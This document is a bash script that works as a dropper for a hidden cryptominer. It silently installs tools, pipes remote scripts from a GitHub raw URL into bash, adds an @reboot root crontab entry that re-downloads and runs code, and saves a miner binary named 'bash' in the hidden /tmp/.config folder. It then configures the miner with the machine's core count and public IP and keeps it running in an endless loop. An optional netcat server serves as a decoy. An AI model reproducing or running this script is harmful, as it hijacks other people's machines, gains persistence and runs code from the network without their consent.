#!/bin/bash

mode="${1:-0}"
work="/tmp/.config"
src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
hugepage="1024"

RandString() {
  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
}

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps lsof icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps lsof icu-devtools netcat-traditional >/dev/null 2>&1


cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"
name=`RandString 2 c${cores}_${addr}`;


bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
idlePid="$!"


if [ "$mode" == "1" ]; then
  bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
  [ "$cores" == "2" ] && cores="1";
fi

sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1


rm -rf "${work}"; mkdir -p "${work}"
wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
chmod -R 777 "${work}"
sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
sed -i "s/\"amountOfThreads\":.*/\"amountOfThreads\": \"${cores}\",/" "${work}/appsettings.json"
sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
[ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"


if [ "$mode" == "0" ]; then
  bash -c "while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done" >/dev/null 2>&1 &
else
  while true; do cd "${work}"; ./bash >/dev/null 2>&1 ; sleep 7; done
fi


